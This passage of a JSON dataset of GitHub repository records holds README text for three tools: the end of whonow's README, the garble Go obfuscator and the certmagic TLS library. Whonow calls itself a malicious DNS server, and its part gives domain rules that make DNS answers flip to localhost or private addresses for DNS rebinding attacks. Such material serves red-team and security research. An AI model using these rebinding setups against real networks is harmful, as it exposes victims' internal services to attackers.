plural and singular strings (e.g. `1time, 3times, 5000times`)\\n\\t- `forever`: Respond with the previous IP address forever.\\n\\t- `repeat`: Repeat the entire set of rules starting from the beginning.\\n- `[uuid/random-string]`: A random string to keep DNS Rebind attacks against the same IP addresses separate from each other. See [Gotchas](#gotchas) for more info.\\n- `example.com`: A domain name you have pointing to a `whonow` nameserver, like the publicly available `rebind.network:53` `whonow` instance.\\n\\nRules can be chained together to form complex response behavior.\\n\\n### Examples\\n\\n```\\n# always respond with 192.168.1.1. This isn't really DNS rebinding\\n# but it still works\\nA.192.168.1.1.forever.rebind.network\\n\\n# alternate between localhost and 10.0.0.1 forever\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network\\n\\n# first respond with 192.168.1.1 then 192.168.1.2. Now respond 192.168.1.3 forever.\\nA.192.168.1.1.1time.192.168.1.2.2times.192.168.1.3.forever.rebind.network\\n\\n# respond with 34.192.228.43 the first time, then whatever `whonow --default-address`\\n# is set to forever after that (default: 127.0.0.1)\\nA.34.192.228.43.1time.rebind.network\\n```\\n\\n### Limitations\\n\\n> Each label [subdomain] may contain zero to 63 characters... The full domain name may not exceed the length of 253 characters in its textual representation. (from the [DNS Wikipedia page](https://en.wikipedia.org/wiki/Domain_Name_System))\\n\\nAdditionally, there may not be more than 127 labels/subdomains.\\n\\n## Gotchas\\n\\n### Use Unique Domain Names\\n\\nEach unique domain name request to `whonow` creates a small state-saving program in the server's RAM. The next time that domain name is requested the program counter increments and the state may be mutated. **All unique domain names are their own unique program instances**. To avoid clashing with other users or having your domain name program's state inadvertently incremented you should add a UUID subdomain after your rule definitions. That UUID should never be reused.\\n\\n```\\n# this\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.8f058b82-4c39-4dfe-91f7-9b07bcd7fbd4.rebind.network\\n\\n# not this\\nA.127.0.0.1.1time.10.0.0.1.1time.repeat.rebind.network\\n```\\n\\n### `--max-ram-domains`\\n\\nThe program state associated with each unique domain name is stored by `whonow` in RAM. To avoid running out of RAM an upper-bound is placed on the number of unique domains who's program state can be managed at the same time. By default, this value is set to 10,000,000, but can be configured with the `--max-ram-domains`. Once this limit is reached, domain names and their saved program state will be removed in the order they were added (FIFO).\\n\\n## Running your own `whonow` server\\n\\nTo run your own `whonow` server in the cloud use your domain name provider's admin panel to configure a custom nameserver pointing to your VPS. Then install `whonow` on that VPS and make sure it's running on port 53 (the default DNS port) and that port 53 is accessible to the Internet.\\n\\n```bash\\n# install\\nnpm install --cli -g whonow@latest\\n\\n# run it!\\nwhonow --port 53\\n\\n# you can also run it with more logging to stdout and save DNS activity to CSV\\nwhonow --port 53 --logfile log.csv --verbose\\n```\\n\\n![whonow screenshot](.images/screenshot.png)\\n\\nIf that \\u261d is too much trouble, feel free to just use the public `whonow` server running on port 53 of `rebind.network`.\\ud83c\\udf10.\\n\\n## Usage\\n\\n```\\n$ whonow --help\\nusage: whonow [-h] [-v] [-p PORT] [-d DEFAULT_ANSWER] [-b MAX_RAM_DOMAINS]\\n [-l LOGFILE] [-m]\\n \\n\\nA malicious DNS server for executing DNS Rebinding attacks on the fly.\\n\\nOptional arguments:\\n -h, --help Show this help message and exit.\\n -v, --version Show program's version number and exit.\\n -p PORT, --port PORT What port to run the DNS server on (default: 53).\\n -d DEFAULT_ANSWER, --default-answer DEFAULT_ANSWER\\n The default IP address to respond with if no rule is \\n found (default: \\\"127.0.0.1\\\").\\n -b MAX_RAM_DOMAINS, --max-ram-domains MAX_RAM_DOMAINS\\n The number of domain name records to store in RAM at \\n once. Once the number of unique domain names queried \\n surpasses this number domains will be removed from \\n memory in the order they were requested. Domains that \\n have been removed in this way will have their program \\n state reset the next time they are queried (default: \\n 10000000).\\n -l LOGFILE, --logfile LOGFILE\\n Log to CSV file (default: false)\\n -m, --verbose Log request timestamp and sender IP address to stdout \\n (default: false)\\n```\\n\\n## Testing\\n\\nA `whonow` server must be running on `localhost:15353` to perform the tests in `test.js`\\n\\n```bash\\n# in one terminal\\nwhonow -p 15353\\n```\\n\\n```bash\\n# in another terminal\\ncd path/to/node_modules/whonow\\nnpm test\\n```\\n\"", "topics": ["dns", "infrastructure", "redteam", "offensive"], "writeup": "", "ignoredescription": false, "id": 8, "full_name": "brannondorsey/whonow", "url": "https://github.com/brannondorsey/whonow", "topic_string": "dns infrastructure redteam offensive"},
{"tags": [], "owner": "burrowers", "description": "Obfuscate Go builds", "name": "garble", "topics_string": "", "language": "Go", "readme": "\"# garble\\n\\n\\tGO111MODULE=on go get mvdan.cc/garble\\n\\nObfuscate Go code by wrapping the Go toolchain. Requires Go 1.15 or later, since\\nGo 1.14 uses an entirely different object format.\\n\\n\\tgarble build [build flags] [packages]\\n\\nSee `garble -h` for up to date usage information.\\n\\n### Purpose\\n\\nProduce a binary that works as well as a regular build, but that has as little\\ninformation about the original source code as possible.\\n\\nThe tool is designed to be:\\n\\n* Coupled with `cmd/go`, to support both `GOPATH` and modules with ease\\n* Deterministic and reproducible, given the same initial source code\\n* Reversible given the original source, to un-garble panic stack traces\\n\\n### Mechanism\\n\\nThe tool wraps calls to the Go compiler and linker to transform the Go build, in\\norder to:\\n\\n* Replace as many useful identifiers as possible with short base64 hashes\\n* Replace package paths with short base64 hashes\\n* Remove all [build](https://golang.org/pkg/runtime/#Version) and [module](https://golang.org/pkg/runtime/debug/#ReadBuildInfo) information\\n* Strip filenames and shuffle position information\\n* Strip debugging information and symbol tables\\n* Obfuscate literals, if the `-literals` flag is given\\n* Removes [extra information](#tiny-mode) if the `-tiny` flag is given\\n\\n### Options\\n\\nBy default, the tool garbles the packages under the current module. If not\\nrunning in module mode, then only the main package is garbled. To specify what\\npackages to garble, set `GOPRIVATE`, documented at `go help module-private`.\\n\\n### Caveats\\n\\nMost of these can improve with time and effort. The purpose of this section is\\nto document the current shortcomings of this tool.\\n\\n* Build caching is not supported, so large projects will likely be slow to\\n build. See [golang/go#41145](https://github.com/golang/go/issues/41145).\\n\\n* Exported methods and fields are never garbled at the moment, since they could\\n be required by interfaces and reflection. This area is a work in progress.\\n\\n* Functions implemented outside Go, such as assembly, aren't garbled since we\\n currently only transform the input Go source.\\n\\n* Go plugins are not currently supported; see [#87](https://github.com/burrowers/garble/issues/87).\\n\\n### Tiny Mode\\n\\nWhen the `-tiny` flag is passed, extra information is stripped from the resulting \\nGo binary. This includes line numbers, filenames, and code in the runtime the \\nprints panics, fatal errors, and trace/debug info. All in all this can make binaries \\n6-10% smaller in our testing.\\n\\nNote: if `-tiny` is passed, no panics, fatal errors will ever be printed, but they can\\nstill be handled internally with `recover` as normal. In addition, the `GODEBUG` \\nenvironmental variable will be ignored.\\n\"", "topics": ["build", "code-obfuscator", "obfuscation", "binary"], "writeup": "Obfuscate Go code by wrapping the Go toolchain. Garble produces a binary that works as well as a regular build, but that has as little information about the original source code as possible.\n", "ignoredescription": true, "id": 9, "full_name": "burrowers/garble", "url": "https://github.com/burrowers/garble", "topic_string": "build code-obfuscator obfuscation binary"},
{"tags": [], "owner": "caddyserver", "description": "Automatic HTTPS for any Go program: fully-managed TLS certificate issuance and renewal", "name": "certmagic", "topics_string": "", "language": "Go", "readme": "\"<p align=\\\"center\\\">\\n\\t<a href=\\\"https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc\\\"><img src=\\\"https://user-images.githubusercontent.com/1128849/49704830-49d37200-fbd5-11e8-8385-767e0cd033c3.png\\\" alt=\\\"CertMagic\\\" width=\\\"550\\\"></a>\\n</p>\\n<h3 align=\\\"center\\\">Easy and Powerful TLS Automation</h3>\\n<p align=\\\"center\\\">The same library used by the <a href=\\\"https://caddyserver.com\\\">Caddy Web Server</a></p>\\n<p align=\\\"center\\\">\\n\\t<a href=\\\"https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc\\\"><img src=\\\"https://img.shields.io/badge/godoc-reference-blue.svg\\\"></a>\\n\\t<a href=\\\"https://github.com/caddyserver/certmagic/actions?query=workflow%3ATests\\\"><img src=\\\"https://github.com/caddyserver/certmagic/workflows/Tests/badge.svg\\\"></a>\\n\\t<a href=\\\"https://sourcegraph.com/github.com/caddyserver/certmagic?badge\\\"><img src=\\\"https://sourcegraph.com/github.com/caddyserver/certmagic/-/badge.svg\\\"></a>\\n</p>\\n\\n\\nCaddy's automagic TLS features&mdash;now for your own Go programs&mdash;in one powerful and easy-to-use library!\\n\\nCertMagic is the most mature, robust, and capable ACME client integration for Go... and perhaps ever.\\n\\nWith CertMagic, you can add one line to your Go application to serve securely over TLS, without ever having to touch certificates.\\n\\nInstead of:\\n\\n```go\\n// plaintext HTTP, gross \\ud83e\\udd22\\nhttp.ListenAndServe(\\\":80\\\", mux)\\n```\\n\\nUse CertMagic:\\n\\n```go\\n// encrypted HTTPS with HTTP->HTTPS redirects - yay! \\ud83d\\udd12\\ud83d\\ude0d\\ncertmagic.HTTPS([]string{\\\"example.com\\\"}, mux)\\n```\\n\\nThat line of code will serve your HTTP router `mux` over HTTPS, complete with HTTP->HTTPS redirects. It obtains and renews the TLS certificates. It staples OCSP responses for greater privacy and security. As long as your domain name points to your server, CertMagic will keep its connections secure.\\n\\nCompared to other ACME client libraries for Go, only CertMagic supports the full suite of ACME features, and no other library matches CertMagic's maturity and reliability.\\n\\n\\n\\n\\nCertMagic - Automatic HTTPS using Let's Encrypt\\n===============================================\\n\\n**Sponsored by Relica - Cross-platform local and cloud file backup:**\\n\\n<a href=\\\"https://relicabackup.com\\\"><img src=\\\"https://caddyserver.com/resources/images/sponsors/relica.png\\\" width=\\\"220\\\" alt=\\\"Relica - Cross-platform file backup to the cloud, local disks, or other computers\\\"></a>\\n\\n\\n## Menu\\n\\n- [Features](#features)\\n- [Requirements](#requirements)\\n- [Installation](#installation)\\n- [Usage](#usage)\\n\\t- [Package Overview](#package-overview)\\n\\t\\t- [Certificate authority](#certificate-authority)\\n\\t\\t- [The `Config` type](#the-config-type)\\n\\t\\t- [Defaults](#defaults)\\n\\t\\t- [Providing an email address](#providing-an-email-address)\\n\\t\\t- [Rate limiting](#rate-limiting)\\n\\t- [Development and testing](#development-and-testing)\\n\\t- [Examples](#examples)\\n\\t\\t- [Serving HTTP handlers with HTTPS](#serving-http-handlers-with-https)\\n\\t\\t- [Starting a TLS listener](#starting-a-tls-listener)\\n\\t\\t- [Getting a tls.Config](#getting-a-tlsconfig)\\n\\t\\t- [Advanced use](#advanced-use)\\n\\t- [Wildcard Certificates](#wildcard-certificates)\\n\\t- [Behind a load balancer (or in a cluster)](#behind-a-load-balancer-or-in-a-cluster)\\n\\t- [The ACME Challenges](#the-acme-challenges)\\n\\t\\t- [HTTP Challenge](#http-challenge)\\n\\t\\t- [TLS-ALPN Challenge](#tls-alpn-challenge)\\n\\t\\t- [DNS Challenge](#dns-challenge)\\n\\t- [On-Demand TLS](#on-demand-tls)\\n\\t- [Storage](#storage)\\n\\t- [Cache](#cache)\\n- [Contributing](#contributing)\\n- [Project History](#project-history)\\n- [Credits and License](#credits-and-license)\\n\\n\\n## Features\\n\\n- Fully automated certificate management including issuance and renewal\\n- One-liner, fully managed HTTPS servers\\n- Full control over almost every aspect of the system\\n- HTTP->HTTPS redirects\\n- Solves all 3 ACME challenges: HTTP, TLS-ALPN, and DNS\\n- Most robust error handling of _any_ ACME client\\n\\t- Challenges are randomized to avoid accidental dependence\\n\\t- Challenges are rotated to overcome certain network blockages\\n\\t- Robust retries for up to 30 days\\n\\t- Exponential backoff with carefully-tuned intervals\\n\\t- Retries with optional test/staging CA endpoint instead of production, to avoid rate limits\\n- Written in Go, a language with memory-safety guarantees\\n- Powered by [ACMEz](https://github.com/mholt/acmez), _the_ premier ACME client library for Go\\n- All [libdns](https://github.com/libdns) DNS providers work out-of-the-box\\n- Pluggable storage implementations (default: file system)\\n- Wildcard certificates\\n- Automatic OCSP stapling ([done right](https://gist.github.com/sleevi/5efe9ef98961ecfb4da8#gistcomment-2336055)) [keeps your sites online!](https://twitter.com/caddyserver/status/1234874273724084226)\\n\\t- Will [automatically attempt](https://twitter.com/mholt6/status/1235577699541762048) to replace [revoked certificates](https://community.letsencrypt.org/t/2020-02-29-caa-rechecking-bug/114591/3?u=mholt)!\\n\\t- Staples stored to disk in case of responder outages\\n- Distributed solving of all challenges (works behind load balancers)\\n\\t- Highly efficient, coordinated management in a fleet\\n\\t- Active locking\\n\\t- Smart queueing\\n- Supports \\\"on-demand\\\" issuance of certificates (during TLS handshakes!)\\n\\t- Caddy / CertMagic pioneered this technology\\n\\t- Custom decision functions to regulate and throttle on-demand behavior\\n- Optional event hooks for observation\\n- Works with any certificate authority (CA) compliant with the ACME specification\\n- Certificate revocation (please, only if private key is compromised)\\n- Must-Staple (optional; not default)\\n- Cross-platform support! Mac, Windows, Linux, BSD, Android...\\n- Scales to hundreds of thousands of names/certificates per instance\\n- Use in conjunction with your own certificates\\n\\n\\n## Requirements\\n\\n1. Public DNS name(s) you control\\n2. Server reachable from public Internet\\n\\t- Or use the DNS challenge to waive this requirement\\n3. Control over port 80 (HTTP) and/or 443 (HTTPS)\\n\\t- Or they can be forwarded to other ports you control\\n\\t- Or use the DNS challenge to waive this requirement\\n\\t- (This is a requirement of the ACME protocol, not a library limitation)\\n4. Persistent storage\\n\\t- Typically the local file system (default)\\n\\t- Other integrations available/possible\\n\\n**_Before using this library, your domain names MUST be pointed (A/AAAA records) at your server (unless you use the DNS challenge)!_**\\n\\n\\n## Installation\\n\\n```bash\\n$ go get github.com/caddyserver/certmagic\\n```\\n\\n\\n## Usage\\n\\n### Package Overview\\n\\n#### Certificate authority\\n\\nThis library uses Let's Encrypt by default, but you can use any certificate authority that conforms to the ACME specification. Known/common CAs are provided as consts in the package, for example `LetsEncryptStagingCA` and `LetsEncryptProductionCA`.\\n\\n#### The `Config` type\\n\\nThe `certmagic.Config` struct is how you can wield the power of this fully armed and operational battle station. However, an empty/uninitialized `Config` is _not_ a valid one! In time, you will learn to use the force of `certmagic.NewDefault()` as I have.\\n\\n#### Defaults\\n\\nThe default `Config` value is called `certmagic.Default`. Change its fields to suit your needs, then call `certmagic.NewDefault()` when you need a valid `Config` value. In other words, `certmagic.Default` is a template and is not valid for use directly.\\n\\nYou can set the default values easily, for example: `certmagic.Default.Issuer = ...`.\\n\\nSimilarly, to configure ACME-specific defaults, use `certmagic.DefaultACME`.\\n\\nThe high-level functions in this package (`HTTPS()`, `Listen()`, `ManageSync()`, and `ManageAsync()`) use the default config exclusively. This is how most of you will interact with the package. This is suitable when all your certificates are managed the same way. However, if you need to manage certificates differently depending on their name, you will need to make your own cache and configs (keep reading).\\n\\n\\n#### Providing an email address\\n\\nAlthough not strictly required, this is highly recommended best practice. It allows you to receive expiration emails if your certificates are expiring for some reason, and also allows the CA's engineers to potentially get in touch with you if something is wrong. I recommend setting `certmagic.DefaultACME.Email` or always setting the `Email` field of a new `Config` struct.\\n\\n\\n#### Rate limiting\\n\\nTo avoid firehosing the CA's servers, CertMagic has built-in rate limiting. Currently, its default limit is up to 10 transactions (obtain or renew) every 1 minute (sliding window). This can be changed by setting the `RateLimitEvents` and `RateLimitEventsWindow` variables, if desired.\\n\\nThe CA may still enforce their own rate limits, and there's nothing (well, nothing ethical) CertMagic can do to bypass them for you.\\n\\nAdditionally, CertMagic will retry failed validations with exponential backoff for up to 30 days, with a reasonable maximum interval between attempts (an \\\"attempt\\\" means trying each enabled challenge type once).\\n\\n\\n### Development and Testing\\n\\nNote that Let's Encrypt imposes [strict rate limits](https://letsencrypt.org/docs/rate-limits/) at its production endpoint, so using it while developing your application may lock you out for a few days if you aren't careful!\\n\\nWhile developing your application and testing it, use [their staging endpoint](https://letsencrypt.org/docs/staging-environment/) which has much higher rate limits. Even then, don't hammer it: but it's much safer for when you're testing. When deploying, though, use their production CA because their staging CA doesn't issue trusted certificates.\\n\\nTo use staging, set `certmagic.DefaultACME.CA = certmagic.LetsEncryptStagingCA` or set `CA` of every `ACMEManager` struct.\\n\\n\\n\\n### Examples\\n\\nThere are many ways to use this library. We'll start with the highest-level (simplest) and work down (more control).\\n\\nAll these high-level examples use `certmagic.Default` and `certmagic.DefaultACME` for the config and the default cache and storage for serving up certificates.\\n\\nFirst, we'll follow best practices and do the following:\\n\\n```go\\n// read and agree to your CA's legal documents\\ncertmagic.DefaultACME.Agreed = true\\n\\n// provide an email address\\ncertmagic.DefaultACME.Email = \\\"you@yours.com\\\"\\n\\n// use the staging endpoint while we're developing\\ncertmagic.DefaultACME.CA = certmagic.LetsEncryptStagingCA\\n```\\n\\nFor fully-functional program examples, check out [this Twitter thread](https://twitter.com/mholt6/status/1073103805112147968) (or read it [unrolled into a single post](https://threadreaderapp.com/thread/1073103805112147968.html)). (Note that the package API has changed slightly since these posts.)\\n\\n\\n#### Serving HTTP handlers with HTTPS\\n\\n```go\\nerr := certmagic.HTTPS([]string{\\\"example.com\\\", \\\"www.example.com\\\"}, mux)\\nif err != nil {\\n\\treturn err\\n}\\n```\\n\\nThis starts HTTP and HTTPS listeners and redirects HTTP to HTTPS!\\n\\n#### Starting a TLS listener\\n\\n```go\\nln, err := certmagic.Listen([]string{\\\"example.com\\\"})\\nif err != nil {\\n\\treturn err\\n}\\n```\\n\\n\\n#### Getting a tls.Config\\n\\n```go\\ntlsConfig, err := certmagic.TLS([]string{\\\"example.com\\\"})\\nif err != nil {\\n\\treturn err\\n}\\n```\\n\\n\\n#### Advanced use\\n\\nFor more control (particularly, if you need a different way of managing each certificate), you'll make and use a `Cache` and a `Config` like so:\\n\\n```go\\ncache := certmagic.NewCache(certmagic.CacheOptions{\\n\\tGetConfigForCert: func(cert certmagic.Certificate) (*certmagic.Config, error) {\\n\\t\\t// do whatever you need to do to get the right\\n\\t\\t// configuration for this certificate; keep in\\n\\t\\t// mind that this config value is used as a\\n\\t\\t// template, and will be completed with any\\n\\t\\t// defaults that are set in the Default config\\n\\t\\treturn &certmagic.Config{\\n\\t\\t\\t// ...\\n\\t\\t}, nil\\n\\t},\\n\\t...\\n})\\n\\nmagic := certmagic.New(cache, certmagic.Config{\\n\\t// any customizations you need go here\\n})\\n\\nmyACME := certmagic.NewACMEManager(magic, ACMEManager{\\n\\tCA: certmagic.LetsEncryptStagingCA,\\n\\tEmail: \\\"you@yours.com\\\",\\n\\tAgreed: true,\\n\\t// plus any other customizations you need\\n})\\n\\nmagic.Issuer = myACME\\n\\n// this obtains certificates or renews them if necessary\\nerr := magic.ManageSync([]string{\\\"example.com\\\", \\\"sub.example.com\\\"})\\nif err != nil {\\n\\treturn err\\n}\\n\\n// to use its certificates and solve the TLS-ALPN challenge,\\n// you can get a TLS config to use in a TLS listener!\\ntlsConfig := magic.TLSConfig()\\n\\n//// OR ////\\n\\n// if you already have a TLS config you don't want to replace,\\n// we can simply set its GetCertificate field and append the\\n// TLS-ALPN challenge protocol to the NextProtos\\nmyTLSConfig.GetCertificate = magic.GetCertificate\\nmyTLSConfig.NextProtos = append(myTLSConfig.NextProtos, tlsalpn01.ACMETLS1Protocol}\\n\\n// the HTTP challenge has to be handled by your HTTP server;\\n// if you don't have one, you should have disabled it earlier\\n// when you made the certmagic.Config\\nhttpMux = myACME.HTTPChallengeHandler(httpMux)\\n```\\n\\nGreat! This example grants you much more flexibility for advanced programs. However, _the vast majority of you will only use the high-level functions described earlier_, especially since you can still customize them by setting the package-level `Default` config.\\n\\n\\n### Wildcard certificates\\n\\nAt time of writing (December 2018), Let's Encrypt only issues wildcard certificates with the DNS challenge. You can easily enable the DNS challenge with CertMagic for numerous providers (see the relevant section in the docs).\\n\\n\\n### Behind a load balancer (or in a cluster)\\n\\nCertMagic runs effectively behind load balancers and/or in cluster/fleet environments. In other words, you can have 10 or 1,000 servers all serving the same domain names, all sharing certificates and OCSP staples.\\n\\nTo do so, simply ensure that each instance is using the same Storage. That is the sole criteria for determining whether an instance is part of a cluster.\\n\\nThe default Storage is implemented using the file system, so mounting the same shared folder is sufficient (see [Storage](#storage) for more on that)! If you need an alternate Storage implementation, feel free to use one, provided that all the instances use the _same_ one. :)\\n\\nSee [Storage](#storage) and the associated [pkg.go.dev](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#Storage) for more information!\\n\\n\\n## The ACME Challenges\\n\\nThis section describes how to solve the ACME challenges. Challenges are how you demonstrate to the certificate authority some control over your domain name, thus authorizing them to grant you a certificate for that name. [The great innovation of ACME](https://www.dotconferences.com/2016/10/matthew-holt-go-with-acme) is that verification by CAs can now be automated, rather than having to click links in emails (who ever thought that was a good idea??).\\n\\nIf you're using the high-level convenience functions like `HTTPS()`, `Listen()`, or `TLS()`, the HTTP and/or TLS-ALPN challenges are solved for you because they also start listeners. However, if you're making a `Config` and you start your own server manually, you'll need to be sure the ACME challenges can be solved so certificates can be renewed.\\n\\nThe HTTP and TLS-ALPN challenges are the defaults because they don't require configuration from you, but they require that your server is accessible from external IPs on low ports. If that is not possible in your situation, you can enable the DNS challenge, which will disable the HTTP and TLS-ALPN challenges and use the DNS challenge exclusively.\\n\\nTechnically, only one challenge needs to be enabled for things to work, but using multiple is good for reliability in case a challenge is discontinued by the CA. This happened to the TLS-SNI challenge in early 2018&mdash;many popular ACME clients such as Traefik and Autocert broke, resulting in downtime for some sites, until new releases were made and patches deployed, because they used only one challenge; Caddy, however&mdash;this library's forerunner&mdash;was unaffected because it also used the HTTP challenge. If multiple challenges are enabled, they are chosen randomly to help prevent false reliance on a single challenge type. And if one fails, any remaining enabled challenges are tried before giving up.\\n\\n\\n### HTTP Challenge\\n\\nPer the ACME spec, the HTTP challenge requires port 80, or at least packet forwarding from port 80. It works by serving a specific HTTP response that only the genuine server would have to a normal HTTP request at a special endpoint.\\n\\nIf you are running an HTTP server, solving this challenge is very easy: just wrap your handler in `HTTPChallengeHandler` _or_ call `SolveHTTPChallenge()` inside your own `ServeHTTP()` method.\\n\\nFor example, if you're using the standard library:\\n\\n```go\\nmux := http.NewServeMux()\\nmux.HandleFunc(\\\"/\\\", func(w http.ResponseWriter, req *http.Request) {\\n\\tfmt.Fprintf(w, \\\"Lookit my cool website over HTTPS!\\\")\\n})\\n\\nhttp.ListenAndServe(\\\":80\\\", myACME.HTTPChallengeHandler(mux))\\n```\\n\\nIf wrapping your handler is not a good solution, try this inside your `ServeHTTP()` instead:\\n\\n```go\\nmagic := certmagic.NewDefault()\\nmyACME := certmagic.NewACMEManager(magic, certmagic.DefaultACME)\\n\\nfunc ServeHTTP(w http.ResponseWriter, req *http.Request) {\\n\\tif myACME.HandleHTTPChallenge(w, r) {\\n\\t\\treturn // challenge handled; nothing else to do\\n\\t}\\n\\t...\\n}\\n```\\n\\nIf you are not running an HTTP server, you should disable the HTTP challenge _or_ run an HTTP server whose sole job it is to solve the HTTP challenge.\\n\\n\\n### TLS-ALPN Challenge\\n\\nPer the ACME spec, the TLS-ALPN challenge requires port 443, or at least packet forwarding from port 443. It works by providing a special certificate using a standard TLS extension, Application Layer Protocol Negotiation (ALPN), having a special value. This is the most convenient challenge type because it usually requires no extra configuration and uses the standard TLS port which is where the certificates are used, also.\\n\\nThis challenge is easy to solve: just use the provided `tls.Config` when you make your TLS listener:\\n\\n```go\\n// use this to configure a TLS listener\\ntlsConfig := magic.TLSConfig()\\n```\\n\\nOr make two simple changes to an existing `tls.Config`:\\n\\n```go\\nmyTLSConfig.GetCertificate = magic.GetCertificate\\nmyTLSConfig.NextProtos = append(myTLSConfig.NextProtos, tlsalpn01.ACMETLS1Protocol}\\n```\\n\\nThen just make sure your TLS listener is listening on port 443:\\n\\n```go\\nln, err := tls.Listen(\\\"tcp\\\", \\\":443\\\", myTLSConfig)\\n```\\n\\n\\n### DNS Challenge\\n\\nThe DNS challenge is perhaps the most useful challenge because it allows you to obtain certificates without your server needing to be publicly accessible on the Internet, and it's the only challenge by which Let's Encrypt will issue wildcard certificates.\\n\\nThis challenge works by setting a special record in the domain's zone. To do this automatically, your DNS provider needs to offer an API by which changes can be made to domain names, and the changes need to take effect immediately for best results. CertMagic supports [all DNS providers with `libdns` implementations](https://github.com/libdns)! It always cleans up the temporary record after the challenge completes.\\n\\nTo enable it, just set the `DNS01Solver` field on a `certmagic.ACMEManager` struct, or set the default `certmagic.ACMEManager.DNS01Solver` variable. For example, if my domains' DNS was served by Cloudflare:\\n\\n```go\\nimport \\\"github.com/libdns/cloudflare\\\"\\n\\ncertmagic.DefaultACME.DNS01Solver = &certmagic.DNS01Solver{\\n\\tDNSProvider: cloudflare.Provider{\\n\\t\\tAPIToken: \\\"topsecret\\\",\\n\\t},\\n}\\n```\\n\\nNow the DNS challenge will be used by default, and I can obtain certificates for wildcard domains, too. Enabling the DNS challenge disables the other challenges for that `certmagic.ACMEManager` instance.\\n\\n\\n## On-Demand TLS\\n\\nNormally, certificates are obtained and renewed before a listener starts serving, and then those certificates are maintained throughout the lifetime of the program. In other words, the certificate names are static. But sometimes you don't know all the names ahead of time, or you don't want to manage all the certificates up front. This is where On-Demand TLS shines.\\n\\nOriginally invented for use in Caddy (which was the first program to use such technology), On-Demand TLS makes it possible and easy to serve certificates for arbitrary or specific names during the lifetime of the server. When a TLS handshake is received, CertMagic will read the Server Name Indication (SNI) value and either load and present that certificate in the ServerHello, or if one does not exist, it will obtain it from a CA right then-and-there.\\n\\nOf course, this has some obvious security implications. You don't want to DoS a CA or allow arbitrary clients to fill your storage with spammy TLS handshakes. That's why, when you enable On-Demand issuance, you should set limits or policy to allow getting certificates. CertMagic has an implicit whitelist built-in which is sufficient for nearly everyone, but also has a more advanced way to control on-demand issuance.\\n\\nThe simplest way to enable on-demand issuance is to set the OnDemand field of a Config (or the default package-level value):\\n\\n```go\\ncertmagic.Default.OnDemand = new(certmagic.OnDemandConfig)\\n```\\n\\nBy setting this to a non-nil value, on-demand TLS is enabled for that config. For convenient security, CertMagic's high-level abstraction functions such as `HTTPS()`, `TLS()`, `ManageSync()`, `ManageAsync()`, and `Listen()` (which all accept a list of domain names) will whitelist those names automatically so only certificates for those names can be obtained when using the Default config. Usually this is sufficient for most users.\\n\\nHowever, if you require advanced control over which domains can be issued certificates on-demand (for example, if you do not know which domain names you are managing, or just need to defer their operations until later), you should implement your own DecisionFunc:\\n\\n```go\\n// if the decision function returns an error, a certificate\\n// may not be obtained for that name at that time\\ncertmagic.Default.OnDemand = &certmagic.OnDemandConfig{\\n\\tDecisionFunc: func(name string) error {\\n\\t\\tif name != \\\"example.com\\\" {\\n\\t\\t\\treturn fmt.Errorf(\\\"not allowed\\\")\\n\\t\\t}\\n\\t\\treturn nil\\n\\t},\\n}\\n```\\n\\nThe [pkg.go.dev](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#OnDemandConfig) describes how to use this in full detail, so please check it out!\\n\\n\\n## Storage\\n\\nCertMagic relies on storage to store certificates and other TLS assets (OCSP staple cache, coordinating locks, etc). Persistent storage is a requirement when using CertMagic: ephemeral storage will likely lead to rate limiting on the CA-side as CertMagic will always have to get new certificates.\\n\\nBy default, CertMagic stores assets on the local file system in `$HOME/.local/share/certmagic` (and honors `$XDG_DATA_HOME` if set). CertMagic will create the directory if it does not exist. If writes are denied, things will not be happy, so make sure CertMagic can write to it!\\n\\nThe notion of a \\\"cluster\\\" or \\\"fleet\\\" of instances that may be serving the same site and sharing certificates, etc, is tied to storage. Simply, any instances that use the same storage facilities are considered part of the cluster. So if you deploy 100 instances of CertMagic behind a load balancer, they are all part of the same cluster if they share the same storage configuration. Sharing storage could be mounting a shared folder, or implementing some other distributed storage system such as a database server or KV store.\\n\\nThe easiest way to change the storage being used is to set `certmagic.DefaultStorage` to a value that satisfies the [Storage interface](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#Storage). Keep in mind that a valid `Storage` must be able to implement some operations atomically in order to provide locking and synchronization.\\n\\nIf you write a Storage implementation, please add it to the [project wiki](https://github.com/caddyserver/certmagic/wiki/Storage-Implementations) so people can find it!\\n\\n\\n## Cache\\n\\nAll of the certificates in use are de-duplicated and cached in memory for optimal performance at handshake-time. This cache must be backed by persistent storage as described above.\\n\\nMost applications will not need to interact with certificate caches directly. Usually, the closest you will come is to set the package-wide `certmagic.DefaultStorage` variable (before attempting to create any Configs). However, if your use case requires using different storage facilities for different Configs (that's highly unlikely and NOT recommended! Even Caddy doesn't get that crazy), you will need to call `certmagic.NewCache()` and pass in the storage you want to use, then get new `Config` structs with `certmagic.NewWithCache()` and pass in the cache.\\n\\nAgain, if you're needing to do this, you've probably over-complicated your application design.\\n\\n\\n## FAQ\\n\\n### Can I use some of my own certificates while using CertMagic?\\n\\nYes, just call the relevant method on the `Config` to add your own certificate to the cache:\\n\\n- [`CacheUnmanagedCertificatePEMBytes()`](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#Config.CacheUnmanagedCertificatePEMBytes)\\n- [`CacheUnmanagedCertificatePEMFile()`](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#Config.CacheUnmanagedCertificatePEMFile)\\n- [`CacheUnmanagedTLSCertificate()`](https://pkg.go.dev/github.com/caddyserver/certmagic?tab=doc#Config.CacheUnmanagedTLSCertificate)\\n\\nKeep in mind that unmanaged certificates are (obviously) not renewed for you, so you'll have to replace them when you do. However, OCSP stapling is performed even for unmanaged certificates that qualify.\\n\\n\\n### Does CertMagic obtain SAN certificates?\\n\\nTechnically all certificates these days are SAN certificates because CommonName is deprecated. But if you're asking whether CertMagic issues and manages certificates with multiple SANs, the answer is no. But it does support serving them, if you provide your own.\\n\\n\\n### How can I listen on ports 80 and 443? Do I have to run as root?\\n\\nOn Linux, you can use `setcap` to grant your binary the permission to bind low ports:\\n\\n```bash\\n$ sudo setcap cap_net_bind_service=+ep /path/to/your/binary\\n```\\n\\nand then you will not need to run with root privileges.\\n\\n\\n## Contributing\\n\\nWe welcome your contributions! Please see our **[contributing 